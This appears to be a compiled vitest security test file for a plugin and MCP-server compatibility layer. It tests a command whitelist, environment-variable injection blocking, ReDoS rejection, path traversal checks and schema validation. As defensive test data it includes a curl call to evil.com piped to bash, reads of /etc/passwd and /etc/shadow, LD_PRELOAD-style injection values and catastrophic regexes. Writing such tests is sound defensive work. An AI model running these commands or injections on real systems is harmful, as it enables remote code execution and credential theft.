/**
 * Security Tests for the Compatibility Layer
 *
 * Tests security fixes for:
 * - Command whitelist (arbitrary code execution prevention)
 * - Environment variable injection blocking
 * - ReDoS vulnerability prevention
 * - Path traversal prevention
 * - Schema validation
 * - Error handling
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { join } from 'path';
import { mkdirSync, writeFileSync, rmSync, existsSync } from 'fs';
import { tmpdir } from 'os';
// Import functions under test
import { discoverPlugins, discoverMcpServers, } from '../compatibility/discovery.js';
import { registerPluginSafePatterns, clearPermissionCache, } from '../compatibility/permission-adapter.js';
import { McpBridge, McpSecurityError, } from '../compatibility/mcp-bridge.js';
// Test fixtures
const TEST_DIR = join(tmpdir(), 'omc-security-test-' + Date.now());
const TEST_PLUGINS_DIR = join(TEST_DIR, 'plugins');
const TEST_MCP_CONFIG = join(TEST_DIR, 'claude_desktop_config.json');
/**
 * Helper to create plugin directory with manifest
 */
function createPlugin(name, manifest) {
    const pluginDir = join(TEST_PLUGINS_DIR, name);
    mkdirSync(pluginDir, { recursive: true });
    writeFileSync(join(pluginDir, 'plugin.json'), JSON.stringify({ name, version: '1.0.0', ...manifest }, null, 2));
    return pluginDir;
}
// ============================================================
// Security Test: Command Whitelist
// ============================================================
describe('Security: Command Whitelist', () => {
    let bridge;
    beforeEach(() => {
        bridge = new McpBridge();
    });
    it('should allow whitelisted commands', () => {
        const whitelisted = ['node', 'npx', 'python', 'python3', 'ruby', 'go', 'deno', 'bun', 'uvx', 'uv'];
        for (const cmd of whitelisted) {
            bridge.registerServer(`test-${cmd}`, {
                command: cmd,
                args: ['--version'],
            });
            // Command should be registered (not throw on registration)
            expect(bridge['serverConfigs'].has(`test-${cmd}`)).toBe(true);
        }
    });
    it('should reject non-whitelisted commands', async () => {
        bridge.registerServer('malicious', {
            command: 'bash',
            args: ['-c', 'echo pwned'],
        });
        await expect(bridge.connect('malicious')).rejects.toThrow(McpSecurityError);
        await expect(bridge.connect('malicious')).rejects.toThrow(/Command not in whitelist/);
    });
    it('should reject absolute path bypass attempts', async () => {
        bridge.registerServer('bypass-attempt', {
            command: '/bin/bash',
            args: ['-c', 'id'],
        });
        await expect(bridge.connect('bypass-attempt')).rejects.toThrow(McpSecurityError);
    });
    it('should reject commands with path components', async () => {
        bridge.registerServer('path-bypass', {
            command: './malicious-script',
            args: [],
        });
        await expect(bridge.connect('path-bypass')).rejects.toThrow(McpSecurityError);
    });
    it('should reject curl/wget commands', async () => {
        bridge.registerServer('network-abuse', {
            command: 'curl',
            args: ['https://evil.com/shell.sh', '|', 'bash'],
        });
        await expect(bridge.connect('network-abuse')).rejects.toThrow(McpSecurityError);
    });
});
// ============================================================
// Security Test: Environment Variable Injection
// ============================================================
describe('Security: Environment Variable Injection', () => {
    let bridge;
    let emittedWarnings;
    beforeEach(() => {
        bridge = new McpBridge();
        emittedWarnings = [];
        bridge.on('security-warning', (data) => emittedWarnings.push(data));
    });
    const DANGEROUS_ENV_VARS = [
        'LD_PRELOAD',
        'LD_LIBRARY_PATH',
        'DYLD_INSERT_LIBRARIES',
        'DYLD_LIBRARY_PATH',
        'NODE_OPTIONS',
        'PYTHONSTARTUP',
        'PYTHONPATH',
        'RUBYOPT',
        'PERL5OPT',
        'BASH_ENV',
    ];
    for (const envVar of DANGEROUS_ENV_VARS) {
        it(`should block ${envVar} environment variable`, async () => {
            bridge.registerServer('env-inject', {
                command: 'node',
                args: ['--version'],
                env: {
                    [envVar]: '/tmp/malicious.so',
                },
            });
            // The connect will fail because we can't actually spawn in tests,
            // but we can verify the warning was emitted
            try {
                await bridge.connect('env-inject');
            }
            catch {
                // Expected to fail
            }
            expect(emittedWarnings.some(w => w.server === 'env-inject' &&
                w.message.includes(envVar))).toBe(true);
        });
    }
    it('should allow safe environment variables', async () => {
        bridge.registerServer('safe-env', {
            command: 'node',
            args: ['--version'],
            env: {
                MY_API_KEY: 'secret',
                PORT: '3000',
                DEBUG: 'true',
            },
        });
        try {
            await bridge.connect('safe-env');
        }
        catch {
            // Connection will fail (no actual server), but no security warning
        }
        expect(emittedWarnings.filter(w => w.server === 'safe-env')).toHaveLength(0);
    });
});
// ============================================================
// Security Test: ReDoS Prevention
// ============================================================
describe('Security: ReDoS Prevention', () => {
    beforeEach(() => {
        clearPermissionCache();
    });
    afterEach(() => {
        if (existsSync(TEST_DIR)) {
            rmSync(TEST_DIR, { recursive: true, force: true });
        }
    });
    // Patterns that safe-regex detects as vulnerable
    const REDOS_PATTERNS = [
        // Exponential backtracking patterns
        '(a+)+$',
        '([a-zA-Z]+)*',
        '(.*a){100}',
        // Nested quantifiers
        '(a*)*b',
        '(a+)*b',
    ];
    // Note: Some edge case patterns like '(a|a)+' and '(a|aa)+$' are not
    // detected by safe-regex. For comprehensive protection, consider
    // using RE2 (google/re2) which guarantees O(n) matching.
    for (const pattern of REDOS_PATTERNS) {
        it(`should reject ReDoS pattern: ${pattern}`, () => {
            const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
            const mockPlugin = {
                name: 'redos-plugin',
                version: '1.0.0',
                path: '/test',
                manifest: {
                    name: 'redos-plugin',
                    version: '1.0.0',
                    permissions: [
                        {
                            tool: 'test-tool',
                            scope: 'read',
                            patterns: [pattern],
                        },
                    ],
                },
                loaded: true,
                tools: [],
            };
            registerPluginSafePatterns(mockPlugin);
            // Should have warned about unsafe pattern
            expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('[Security] Skipping unsafe regex pattern'));
            consoleSpy.mockRestore();
        });
    }
    it('should allow safe regex patterns', () => {
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        const mockPlugin = {
            name: 'safe-plugin',
            version: '1.0.0',
            path: '/test',
            manifest: {
                name: 'safe-plugin',
                version: '1.0.0',
                permissions: [
                    {
                        tool: 'test-tool',
                        scope: 'read',
                        patterns: [
                            '^[a-z]+$',
                            '\\d{4}-\\d{2}-\\d{2}',
                            'hello|world',
                        ],
                    },
                ],
            },
            loaded: true,
            tools: [],
        };
        registerPluginSafePatterns(mockPlugin);
        // Should not have warned
        expect(consoleSpy).not.toHaveBeenCalled();
        consoleSpy.mockRestore();
    });
});
// ============================================================
// Security Test: Path Traversal Prevention
// ============================================================
describe('Security: Path Traversal Prevention', () => {
    beforeEach(() => {
        mkdirSync(TEST_PLUGINS_DIR, { recursive: true });
    });
    afterEach(() => {
        if (existsSync(TEST_DIR)) {
            rmSync(TEST_DIR, { recursive: true, force: true });
        }
    });
    it('should reject skills path with path traversal', () => {
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        const pluginDir = createPlugin('traversal-plugin', {
            skills: '../../../etc/passwd',
        });
        const plugins = discoverPlugins({ pluginPaths: [TEST_PLUGINS_DIR] });
        const plugin = plugins.find(p => p.name === 'traversal-plugin');
        // Plugin should be loaded but with no tools (path was rejected)
        expect(plugin?.tools).toHaveLength(0);
        expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('[Security] Path traversal detected'));
        consoleSpy.mockRestore();
    });
    it('should reject agents path with path traversal', () => {
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        createPlugin('agents-traversal', {
            agents: '../../../../tmp/evil',
        });
        const plugins = discoverPlugins({ pluginPaths: [TEST_PLUGINS_DIR] });
        const plugin = plugins.find(p => p.name === 'agents-traversal');
        expect(plugin?.tools).toHaveLength(0);
        expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('[Security] Path traversal detected'));
        consoleSpy.mockRestore();
    });
    it('should reject array of paths with traversal', () => {
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        createPlugin('array-traversal', {
            skills: ['./valid-skills', '../../../etc/shadow'],
        });
        discoverPlugins({ pluginPaths: [TEST_PLUGINS_DIR] });
        expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('[Security] Path traversal detected'));
        consoleSpy.mockRestore();
    });
    it('should allow valid relative paths', () => {
        const pluginDir = createPlugin('valid-paths', {
            skills: './skills',
            agents: './agents',
        });
        // Create actual directories
        mkdirSync(join(pluginDir, 'skills'), { recursive: true });
        mkdirSync(join(pluginDir, 'agents'), { recursive: true });
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        discoverPlugins({ pluginPaths: [TEST_PLUGINS_DIR] });
        // Should not have any path traversal warnings
        const traversalWarnings = consoleSpy.mock.calls.filter(call => call[0]?.includes?.('Path traversal'));
        expect(traversalWarnings).toHaveLength(0);
        consoleSpy.mockRestore();
    });
});
// ============================================================
// Security Test: Schema Validation
// ============================================================
describe('Security: Schema Validation', () => {
    beforeEach(() => {
        mkdirSync(TEST_PLUGINS_DIR, { recursive: true });
    });
    afterEach(() => {
        if (existsSync(TEST_DIR)) {
            rmSync(TEST_DIR, { recursive: true, force: true });
        }
    });
    it('should reject plugin manifest with invalid name pattern', () => {
        const pluginDir = join(TEST_PLUGINS_DIR, 'invalid-name');
        mkdirSync(pluginDir, { recursive: true });
        writeFileSync(join(pluginDir, 'plugin.json'), JSON.stringify({
            name: '../../../malicious',
            version: '1.0.0',
        }));
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        const plugins = discoverPlugins({ pluginPaths: [TEST_PLUGINS_DIR] });
        const plugin = plugins.find(p => p.path === pluginDir);
        // Should not be loaded (validation failed)
        expect(plugin?.loaded).toBe(false);
        expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('[Security] Invalid plugin manifest'));
        consoleSpy.mockRestore();
    });
    it('should reject plugin manifest missing required fields', () => {
        const pluginDir = join(TEST_PLUGINS_DIR, 'missing-fields');
        mkdirSync(pluginDir, { recursive: true });
        writeFileSync(join(pluginDir, 'plugin.json'), JSON.stringify({
            description: 'Missing name and version',
        }));
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        const plugins = discoverPlugins({ pluginPaths: [TEST_PLUGINS_DIR] });
        const plugin = plugins.find(p => p.path === pluginDir);
        expect(plugin?.loaded).toBe(false);
        consoleSpy.mockRestore();
    });
    it('should reject MCP config with invalid server config', () => {
        writeFileSync(TEST_MCP_CONFIG, JSON.stringify({
            mcpServers: {
                'invalid-server': {
                    // Missing required 'command' field
                    args: ['--help'],
                },
            },
        }));
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        const servers = discoverMcpServers({ mcpConfigPath: TEST_MCP_CONFIG });
        // Invalid server should not be included
        expect(servers.find(s => s.name === 'invalid-server')).toBeUndefined();
        expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('[Security] Invalid MCP server config'));
        consoleSpy.mockRestore();
    });
    it('should reject MCP config with excessively long command', () => {
        writeFileSync(TEST_MCP_CONFIG, JSON.stringify({
            mcpServers: {
                'long-command': {
                    command: 'a'.repeat(600), // Exceeds 500 char limit
                },
            },
        }));
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        const servers = discoverMcpServers({ mcpConfigPath: TEST_MCP_CONFIG });
        expect(servers.find(s => s.name === 'long-command')).toBeUndefined();
        consoleSpy.mockRestore();
    });
    it('should accept valid plugin manifest', () => {
        createPlugin('valid-plugin', {
            description: 'A valid plugin',
            namespace: 'my-namespace',
        });
        const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => { });
        const plugins = discoverPlugins({ pluginPaths: [TEST_PLUGINS_DIR] });
        const plugin = plugins.find(p => p.name === 'valid-plugin');
        expect(plugin?.loaded).toBe(true);
        // Should not have validation warnings for this plugin
        const validationWarnings = consoleSpy.mock.calls.filter(call => call[0]?.includes?.('valid-plugin'));
        expect(validationWarnings).toHaveLength(0);
        consoleSpy.mockRestore();
    });
});
// ============================================================
// Security Test: Error Handling
// ============================================================
describe('Security: Error Handling', () => {
    let bridge;
    let spawnErrors;
    beforeEach(() => {
        bridge = new McpBridge();
        spawnErrors = [];
        bridge.on('spawn-error', (data) => spawnErrors.push(data));
    });
    it('should have spawn-error event handler registered', () => {
        // The bridge should emit spawn-error on child process errors
        expect(bridge.listenerCount('spawn-error')).toBe(1);
    });
    it('should handle connection to non-existent server gracefully', async () => {
        await expect(bridge.connect('nonexistent')).rejects.toThrow(/Unknown MCP server/);
    });
    it('should not leave zombie connections on spawn failure', async () => {
        bridge.registerServer('fail-spawn', {
            command: 'node',
            args: ['--nonexistent-file-that-does-not-exist.js'],
        });
        try {
            await bridge.connect('fail-spawn');
        }
        catch {
            // Expected to fail
        }
        // Should not have an active connection
        expect(bridge.isConnected('fail-spawn')).toBe(false);
    });
});
//# sourceMappingURL=compatibility-security.test.js.map